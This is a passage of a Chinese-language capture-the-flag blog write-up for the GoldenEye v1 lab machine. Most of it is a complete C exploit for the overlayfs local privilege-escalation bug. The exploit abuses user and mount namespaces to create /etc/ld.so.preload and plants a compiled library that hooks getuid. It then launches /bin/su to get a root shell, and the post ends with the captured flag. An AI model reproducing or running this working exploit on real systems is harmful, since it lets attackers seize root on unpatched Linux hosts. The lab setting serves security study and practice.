class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mount.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LIB <span class="string">&quot;#include &lt;unistd.h&gt;\n\nuid_t(*_real_getuid) (void);\nchar path[128];\n\nuid_t\ngetuid(void)\n&#123;\n_real_getuid = (uid_t(*)(void)) dlsym((void *) -1, \&quot;getuid\&quot;);\nreadlink(\&quot;/proc/self/exe\&quot;, (char *) &amp;path, 128);\nif(geteuid() == 0 &amp;&amp; !strcmp(path, \&quot;/bin/su\&quot;)) &#123;\nunlink(\&quot;/etc/ld.so.preload\&quot;);unlink(\&quot;/tmp/ofs-lib.so\&quot;);\nsetresuid(0, 0, 0);\nsetresgid(0, 0, 0);\nexecle(\&quot;/bin/sh\&quot;, \&quot;sh\&quot;, \&quot;-i\&quot;, NULL, NULL);\n&#125;\n    return _real_getuid();\n&#125;\n&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">char</span> child_stack[<span class="number">1024</span>*<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">child_exec</span><span class="params">(<span class="type">void</span> *stuff)</span> &#123;</span><br><span class="line">    <span class="type">char</span> *file;</span><br><span class="line">    system(<span class="string">&quot;rm -rf /tmp/ns_sploit&quot;</span>);</span><br><span class="line">    mkdir(<span class="string">&quot;/tmp/ns_sploit&quot;</span>, <span class="number">0777</span>);</span><br><span class="line">    mkdir(<span class="string">&quot;/tmp/ns_sploit/work&quot;</span>, <span class="number">0777</span>);</span><br><span class="line">    mkdir(<span class="string">&quot;/tmp/ns_sploit/upper&quot;</span>, <span class="number">0777</span>);</span><br><span class="line">    mkdir(<span class="string">&quot;/tmp/ns_sploit/o&quot;</span>, <span class="number">0777</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;mount #1\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (mount(<span class="string">&quot;overlay&quot;</span>, <span class="string">&quot;/tmp/ns_sploit/o&quot;</span>, <span class="string">&quot;overlayfs&quot;</span>, MS_MGC_VAL, <span class="string">&quot;lowerdir=/proc/sys/kernel,upperdir=/tmp/ns_sploit/upper&quot;</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (mount(<span class="string">&quot;overlay&quot;</span>, <span class="string">&quot;/tmp/ns_sploit/o&quot;</span>, <span class="string">&quot;overlay&quot;</span>, MS_MGC_VAL, <span class="string">&quot;lowerdir=/sys/kernel/security/apparmor,upperdir=/tmp/ns_sploit/upper,workdir=/tmp/ns_sploit/work&quot;</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;no FS_USERNS_MOUNT for overlayfs on this kernel\n&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        file = <span class="string">&quot;.access&quot;</span>;</span><br><span class="line">        chmod(<span class="string">&quot;/tmp/ns_sploit/work/work&quot;</span>, <span class="number">0777</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        file = <span class="string">&quot;ns_last_pid&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    chdir(<span class="string">&quot;/tmp/ns_sploit/o&quot;</span>);</span><br><span class="line">    rename(file, <span class="string">&quot;ld.so.preload&quot;</span>);</span><br><span class="line"></span><br><span class="line">    chdir(<span class="string">&quot;/&quot;</span>);</span><br><span class="line">    umount(<span class="string">&quot;/tmp/ns_sploit/o&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;mount #2\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (mount(<span class="string">&quot;overlay&quot;</span>, <span class="string">&quot;/tmp/ns_sploit/o&quot;</span>, <span class="string">&quot;overlayfs&quot;</span>, MS_MGC_VAL, <span class="string">&quot;lowerdir=/tmp/ns_sploit/upper,upperdir=/etc&quot;</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (mount(<span class="string">&quot;overlay&quot;</span>, <span class="string">&quot;/tmp/ns_sploit/o&quot;</span>, <span class="string">&quot;overlay&quot;</span>, MS_MGC_VAL, <span class="string">&quot;lowerdir=/tmp/ns_sploit/upper,upperdir=/etc,workdir=/tmp/ns_sploit/work&quot;</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        chmod(<span class="string">&quot;/tmp/ns_sploit/work/work&quot;</span>, <span class="number">0777</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    chmod(<span class="string">&quot;/tmp/ns_sploit/o/ld.so.preload&quot;</span>, <span class="number">0777</span>);</span><br><span class="line">    umount(<span class="string">&quot;/tmp/ns_sploit/o&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 添加返回语句</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">    <span class="type">int</span> status, fd, lib;</span><br><span class="line">    <span class="type">pid_t</span> wrapper, init;</span><br><span class="line">    <span class="type">int</span> clone_flags = CLONE_NEWNS | SIGCHLD;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;spawning threads\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((wrapper = fork()) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (unshare(CLONE_NEWUSER) != <span class="number">0</span>)</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;failed to create new user namespace\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((init = fork()) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">pid_t</span> pid = clone(child_exec, child_stack + (<span class="number">1024</span> * <span class="number">1024</span>), clone_flags, <span class="literal">NULL</span>);</span><br><span class="line">            <span class="keyword">if</span> (pid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;failed to create new mount namespace\n&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            waitpid(pid, &amp;status, <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        waitpid(init, &amp;status, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    usleep(<span class="number">300000</span>);</span><br><span class="line">    wait(<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;child threads done\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/etc/ld.so.preload&quot;</span>, O_WRONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;exploit failed\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;/etc/ld.so.preload created\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;creating shared library\n&quot;</span>);</span><br><span class="line">    lib = open(<span class="string">&quot;/tmp/ofs-lib.c&quot;</span>, O_CREAT | O_WRONLY, <span class="number">0777</span>);</span><br><span class="line">    write(lib, LIB, <span class="built_in">strlen</span>(LIB));</span><br><span class="line">    close(lib);</span><br><span class="line">    lib = system(<span class="string">&quot;cc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (lib != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;couldn&#x27;t create dynamic library\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    write(fd, <span class="string">&quot;/tmp/ofs-lib.so\n&quot;</span>, <span class="number">16</span>);</span><br><span class="line">    close(fd);</span><br><span class="line">    system(<span class="string">&quot;rm -rf /tmp/ns_sploit /tmp/ofs-lib.c&quot;</span>);</span><br><span class="line">    execl(<span class="string">&quot;/bin/su&quot;</span>, <span class="string">&quot;su&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 添加返回语句</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译后赋权直接执行提权</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20241016203719963.png" alt="image-20241016203719963"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1  Alec told me to place the codes here: </span><br><span class="line">  </span><br><span class="line">2  568628e0d993b1973adc718237da6e93</span><br><span class="line">  </span><br><span class="line">3  If you captured this make sure to go here.....</span><br><span class="line">4  /006-final/xvf7-flag/</span><br></pre></td></tr></table></figure>

</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://xyaxxya.github.io">yiyi</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://xyaxxya.github.io/2024/10/15/1-GoldenEye-v1/">https://xyaxxya.github.io/2024/10/15/1-GoldenEye-v1/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://xyaxxya.github.io" target="_blank">Yiyi</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F/">渗透</a></div><div class="post_share"><div class="social-share" data-image="https://www.dmoe.cc/random.php?5348" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/10/17/2-Lampiao/" title="2-Lampiao"><img class="cover" src="https://www.dmoe.cc/random.php?9845" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">2-Lampiao</div></div></a></div><div class="next-post pull-right"><a href="/2024/10/15/Newstar-week3/" title="Newstar-week3"><img class="cover" src="https://www.dmoe.cc/random.php?9577" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Newstar-week3</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/10/17/2-Lampiao/" title="2-Lampiao"><img class="cover" src="https://www.dmoe.cc/random.php?9845" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-17</div><div class="title">2-Lampiao</div></div></a></div><div><a href="/2024/11/29/5-w1r3s-v1-0/" title="5-w1r3s.v1.0"><img class="cover" src="https://www.dmoe.cc/random.php?8951" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-29</div><div class="title">5-w1r3s.v1.0</div></div></a></div><div><a href="/2024/09/05/AI-web%E9%9D%B6%E5%9C%BA/" title="AI-web靶场"><img class="cover" src="https://www.dmoe.cc/random.php?4681" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-05</div><div class="title">AI-web靶场</div></div></a></div><div><a href="/2024/10/17/3-Raven2/" title="3-Raven2"><img class="cover" src="https://www.dmoe.cc/random.php?4132" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-17</div><div class="title">3-Raven2</div></div></a></div><div><a href="/2024/11/06/4-Tr0ll/" title="4-Tr0ll"><img class="cover" src="https://www.dmoe.cc/random.php?3664" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-06</div><div class="title">4-Tr0ll</div></div></a></div><div><a href="/2024/12/17/HackMyVM%20Airbind/" title="HackMyVM Airbind"><img class="cover" src="https://www.dmoe.cc/random.php?7554" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-17</div><div class="title">HackMyVM Airbind</div></div></a></div></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s2.loli.net/2024/02/16/Ixe9Cyq2mFBj74T.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">yiyi</div><div class="author-info__description">春风得意马蹄疾，一日看尽长安花</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">49</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">64</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xyaxxya"><i class="fab fa-github"></i><span>关注捏</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/xyaxxya" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="/3170234809@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a><a class="social-icon" href="https://blog.csdn.net/xydsg" target="_blank" title="CSDN"><i class="fa fa-book-open"></i></a><a class="social-icon" href="http://wpa.qq.com/msgrd?v=3&amp;uin=3170234809&amp;site=qq&amp;menu=yes" target="_blank" title="QQ"><i class="fab fa-qq"></i></a><a class="social-icon" href="http://wpa.qq.com/msgrd?v=3&amp;uin=3170234809&amp;site=qq&amp;menu=yes" target="_blank" title="Email"><i class="fas fa-envelope-open-text"></i></a><a class="social-icon" href="https://xyaxxya.github.io/2023/09/23/about-me/" target="_blank" title="wechat"><i class="fab fa-weixin"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">慢慢来，比较快</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/12/24/HackMyVM%20p4l4nc4/" title="HackMyVM p4l4nc4"><img src="https://www.dmoe.cc/random.php?7595" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HackMyVM p4l4nc4"/></a><div class="content"><a class="title" href="/2024/12/24/HackMyVM%20p4l4nc4/" title="HackMyVM p4l4nc4">HackMyVM p4l4nc4</a><time datetime="2024-12-24T07:57:01.000Z" title="发表于 2024-12-24 15:57:01">2024-12-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/12/19/HackMyVM%20JO2024/" title="HackMyVM JO2024"><img src="https://www.dmoe.cc/random.php?7711" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HackMyVM JO2024"/></a><div class="content"><a class="title" href="/2024/12/19/HackMyVM%20JO2024/" title="HackMyVM JO2024">HackMyVM JO2024</a><time datetime="2024-12-19T00:22:41.000Z" title="发表于 2024-12-19 08:22:41">2024-12-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/12/18/HackMyVM%20Lookup/" title="HackMyVM Lookup"><img src="https://www.dmoe.cc/random.php?172" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HackMyVM Lookup"/></a><div class="content"><a class="title" href="/2024/12/18/HackMyVM%20Lookup/" title="HackMyVM Lookup">HackMyVM Lookup</a><time datetime="2024-12-18T09:49:31.000Z" title="发表于 2024-12-18 17:49:31">2024-12-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/12/18/HackMyVM%20HackingToys/" title="HackMyVM HackingToys"><img src="https://www.dmoe.cc/random.php?7012" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HackMyVM HackingToys"/></a><div class="content"><a class="title" href="/2024/12/18/HackMyVM%20HackingToys/" title="HackMyVM HackingToys">HackMyVM HackingToys</a><time datetime="2024-12-18T00:14:56.000Z" title="发表于 2024-12-18 08:14:56">2024-12-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/12/17/HackMyVM%20Airbind/" title="HackMyVM Airbind"><img src="https://www.dmoe.cc/random.php?7554" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HackMyVM Airbind"/></a><div class="content"><a class="title" href="/2024/12/17/HackMyVM%20Airbind/" title="HackMyVM Airbind">HackMyVM Airbind</a><time datetime="2024-12-17T08:42:02.000Z" title="发表于 2024-12-17 16:42:02">2024-12-17</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 By yiyi</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">欢迎常来喵~</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.12.0"></script><script src="/js/main.js?v=4.12.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>(() => {
  const initValine = () => {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: 'pYgEIy3e8aneCT2SHN7sYl1L-gzGzoHsz',
      appKey: 'V8vEx9nsiDEMy45ekCcPUaiN',
      avatar: 'monsterid',
      serverURLs: 'https://pygeiy3e.lc-cn-n1-shared.com',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: true
    }, null))
  }

  const loadValine = async () => {
    if (typeof Valine === 'function') initValine()
    else {
      await getScript('https://cdn.jsdelivr.net/npm/valine@1.5.1/dist/Valine.min.js')
      initValine()
    }
  }

  if ('Valine' === 'Valine' || !false) {
    if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
    else setTimeout(loadValine, 0)
  } else {
    window.loadOtherComment = loadValine
  }
})()</script></div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="true" data-click="false"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = true;
document.body.addEventListener('input', POWERMODE);
</script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/click-heart.min.js" async="async" mobile="true"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/click-show-text.min.js" data-mobile="false" data-text="❤️,🩷,🧡,💛,💚,💙,🩵,💜,🤎,🖤,🩶,🤍" data-fontsize="15px" data-random="random" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.12.0"></script></div></div></body></html>